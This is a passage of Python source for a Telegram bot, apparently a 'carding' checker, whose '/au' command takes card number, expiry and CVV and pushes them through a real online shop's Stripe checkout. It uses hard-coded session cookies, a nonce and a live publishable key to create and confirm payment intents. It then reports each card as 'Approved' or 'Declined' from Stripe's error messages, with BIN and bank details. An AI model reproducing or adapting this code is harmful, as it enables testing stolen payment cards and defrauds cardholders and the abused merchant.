╚═══════════════════════╝ """)
    
    if "Your card was declined." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
        

########################### GATE AU #################################
        
        
@iniciar.message_handler(commands=["au"], commands_prefix=comand)
async def auth(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: ❗ Comprobando acceso ❗</b>")
    time.sleep(1)
    user = message.from_user.id
    if user in admins :
        await contra.edit_text('Estas autorizado!')
    
    else:
        await contra.edit_text('❗ No tienes acceso para utilizar este comando. ❗ Contacta a @DarwinOficial.')
        return str;
    ini = time.perf_counter()
    ccs = message.text[len('/au '):]
    ccs1 = ccs
    if not ccs1:
        await contra.edit_text("❗ ERROR INGRESE BIEN LA TARJETA  ❗")
    
    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3] 
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    
    nombre = "Andres"
    correo = "jefersonbenthanpalacio@gmail.com"

    cabeza= {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'accept': '*/*',
    'content-type': 'text/plain;charset=UTF-8'
    }
    

    apigate2 = uniproxy.post('https://m.stripe.com/6', headers=cabeza).json()

    muid = apigate2["muid"]
    guid = apigate2["guid"]
    sid = apigate2["sid"]
    
    
    apis = uniproxy.get(f"https://bins-su-ani.vercel.app/api/{cc[:6]}").json()

    result=apis['result']
    msg=apis['message']
    data=apis['data']
    vendor=data['vendor']
    bn=data['bin']
    typ=data['type']
    lv=data['level']
    bank=data['bank']
    country=data['country']
    countryinfo=data['countryInfo']
    name=countryinfo['name']
    emoji=countryinfo['emoji']
    cd=countryinfo['code']
    dialCode=countryinfo['dialCode']
    #await message.reply(f"""
    #<code> {sid} </code>
    #<code> {muid} </code>
    #<code> {guid} </code>""")
    
    
    
    cookies15 = {
    'woocommerce_multicurrency_forced_currency': 'USD',
    'woocommerce_multicurrency_language': 'en',
    '_ga': 'GA1.1.1490602868.1673987273',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2023-01-17%2020%3A27%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.gentlemansride.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2023-01-17%2020%3A27%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.gentlemansride.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    '_fbp': 'fb.1.1673987275807.1877428702',
    '__stripe_mid': '44900488-0951-40b4-95b5-d65d2f36b38b89b6f4',
    'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%206.3%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F109.0.0.0%20Safari%2F537.36%20Edg%2F109.0.1518.55',
    '__stripe_sid': '59e3d0a5-da9c-4ea1-b53a-310987b81d048a8cf6',
    'woocommerce_items_in_cart': '1',
    'wp_woocommerce_session_02924ad59b8fd7847e3805a601dbf700': 't_79062a6d4b328e8f33e3692c078fc3%7C%7C1674369095%7C%7C1674365495%7C%7C5fb43c16b6760cacdbdba1609b9d97bc',
    'mailchimp.cart.current_email': 'bcdvaapmdc@triots.com.da',
    'mailchimp_user_previous_email': 'bcdvaapmdc%40triots.com.da',
    'mailchimp_user_email': 'bcdvaapmdc%40triots.com.da',
    'mailchimp_landing_site': 'https%3A%2F%2Fshop.gentlemansride.com%2Fwp-content%2Fthemes%2Frazzi%2Fassets%2Fjs%2Fplugins%2Fswiper.min.js.map',
    'woocommerce_cart_hash': '5a92ed325dbe0c5102ec85fc620432c1',
    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.gentlemansride.com%2Fcheckout%2F',
    '_ga_DZDRWQT2ZQ': 'GS1.1.1674196193.2.1.1674196483.0.0.0',
    }

    headers15 = {
    'authority': 'shop.gentlemansride.com',
    'accept': '*/*',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'woocommerce_multicurrency_forced_currency=USD; woocommerce_multicurrency_language=en; _ga=GA1.1.1490602868.1673987273; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-01-17%2020%3A27%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.gentlemansride.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2023-01-17%2020%3A27%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.gentlemansride.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; _fbp=fb.1.1673987275807.1877428702; __stripe_mid=44900488-0951-40b4-95b5-d65d2f36b38b89b6f4; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%206.3%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F109.0.0.0%20Safari%2F537.36%20Edg%2F109.0.1518.55; __stripe_sid=59e3d0a5-da9c-4ea1-b53a-310987b81d048a8cf6; woocommerce_items_in_cart=1; wp_woocommerce_session_02924ad59b8fd7847e3805a601dbf700=t_79062a6d4b328e8f33e3692c078fc3%7C%7C1674369095%7C%7C1674365495%7C%7C5fb43c16b6760cacdbdba1609b9d97bc; mailchimp.cart.current_email=bcdvaapmdc@triots.com.da; mailchimp_user_previous_email=bcdvaapmdc%40triots.com.da; mailchimp_user_email=bcdvaapmdc%40triots.com.da; mailchimp_landing_site=https%3A%2F%2Fshop.gentlemansride.com%2Fwp-content%2Fthemes%2Frazzi%2Fassets%2Fjs%2Fplugins%2Fswiper.min.js.map; woocommerce_cart_hash=5a92ed325dbe0c5102ec85fc620432c1; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.gentlemansride.com%2Fcheckout%2F; _ga_DZDRWQT2ZQ=GS1.1.1674196193.2.1.1674196483.0.0.0',
    'origin': 'https://shop.gentlemansride.com',
    'referer': 'https://shop.gentlemansride.com/checkout/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Microsoft Edge";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.55',
    'x-requested-with': 'XMLHttpRequest',
    }

    params15 = {
    'wc-ajax': 'wc_stripe_create_payment_intent',
    }

    data15 = {
    '_ajax_nonce': '3dcf51b975',
    }

    response15 = uniproxy.post('https://shop.gentlemansride.com/', params=params15, cookies=cookies15, headers=headers15, data=data15).json()
    
    pi = response15['data']['id']
    secret = response15['data']['client_secret']
    
 
 
    headers16 = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Microsoft Edge";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.55',
    }

    data16 = f'return_url=https%3A%2F%2Fshop.gentlemansride.com%2Fcheckout%2Forder-received%2F90976%2F%3Fkey%3Dwc_order_YGvFLOtwL9UrR%26utm_nooverride%3D1%26order_id%3D90976%26wc_payment_method%3Dstripe%26_wpnonce%3D0e46ee6116%26save_payment_method%3Dno&payment_method_data[billing_details][name]=darwin+moreno&payment_method_data[billing_details][email]=bcdvaapmdc%40triots.com.da&payment_method_data[billing_details][phone]=4325434567&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=street+673576&payment_method_data[billing_details][address][line2]=av.+avez&payment_method_data[billing_details][address][city]=new+york&payment_method_data[billing_details][address][state]=NY&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[payment_user_agent]=stripe.js%2Fe9a259df8%3B+stripe-js-v3%2Fe9a259df8%3B+payment-element&payment_method_data[time_on_page]=39165&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_516QbV2JbsF9PepYEy9rCPMcYEy6vlZDkLKQhTQtwpYjFRA9LkzmA7dlNw7DFbL6n3buy2j2Hu8itBH9qc9JbxPmg00MNn3hi7V&client_secret={secret}'

    response16 = uniproxy.post(f'https://api.stripe.com/v1/payment_intents/{pi}/confirm', headers=headers16, data=data16).json()
    error16 = response16['error']['code']
    error26 = response16['error']['message']
    
    
    
    final = time.perf_counter() 
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡]</b>")
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡][🟢]</b>")

    time.sleep(1)
    
            
    if "Your card's security code is incorrect." in error26:
        await m3.edit_text(f""" 
༺✮•°◤ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 ◥°•✮༻                       
╔═══════════════════════╗ 
  π<b>▫️CHARGED AUTH▫️</b>
 ════════════════════════                      
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑪𝑪𝑵 ✅
  π<b>▫️Respuesta➞</b> {error26}
  π<b>▫️charged➞ $10.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
    if "incorrect_number" in error26:
        await m3.edit_text(f""" 
༺✮•°◤ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 ◥°•✮༻                       
╔═══════════════════════╗ 
  π<b>▫️CHARGED AUTH▫️</b>
 ════════════════════════                      
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error26}
  π<b>▫️charged➞ $10.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
    if "You have exceeded the maximum number of declines on this card in the last 24 hour period. Please contact us via https://support.stripe.com/contact if you need further assistance." in error26:
        await m3.edit_text(f""" 
༺✮•°◤ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 ◥°•✮༻                       
╔═══════════════════════╗ 
  π<b>▫️CHARGED AUTH▫️</b>
 ════════════════════════                      
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error26}
  π<b>▫️charged➞ $10.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card's security code is invalid." in error26:
        await m3.edit_text(f""" 
༺✮•°◤ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 ◥°•✮༻                       
╔═══════════════════════╗ 
  π<b>▫️CHARGED AUTH▫️</b>
 ════════════════════════                      
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error26}
  π<b>▫️charged➞ $10.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card does not support this type of purchase." in error26:
        await m3.edit_text(f""" 
༺✮•°◤ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 ◥°•✮༻                       
╔═══════════════════════╗ 
  π<b>▫️CHARGED AUTH▫️</b>
 ════════════════════════                      
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error26}
  π<b>▫️charged➞ $10.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card's expiration year is invalid." in error26:
        await m3.edit_text(f""" 
༺✮•°◤ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 ◥°•✮༻                       
╔═══════════════════════╗ 
  π<b>▫️CHARGED AUTH▫️</b>
 ════════════════════════                      
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error26}
  π<b>▫️charged➞ $10.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card has insufficient funds." in error26:
        await m3.edit_text(f""" 
༺✮•°◤ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 ◥°•✮༻                       
╔═══════════════════════╗ 
  π<b>▫️CHARGED AUTH▫️</b>
 ════════════════════════                      
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑪𝒗𝒗 ✅
  π<b>▫️Respuesta➞</b> {error26}
  π<b>▫️charged➞ $10.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
    
    if "Your card was declined." in error26:
        await m3.edit_text(f""" 

༺✮•°◤ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 ◥°•✮༻                       
╔═══════════════════════╗ 
  π<b>▫️CHARGED AUTH▫️</b>
 ════════════════════════                      
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error26}
  π<b>▫️charged➞ $10.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)



     
    
print("CODIGO EN LINEA")
logging.basicConfig(level=logging.INFO)

if __name__ == '__main__':
    executor.start_polling(iniciar, skip_updates=True)
    
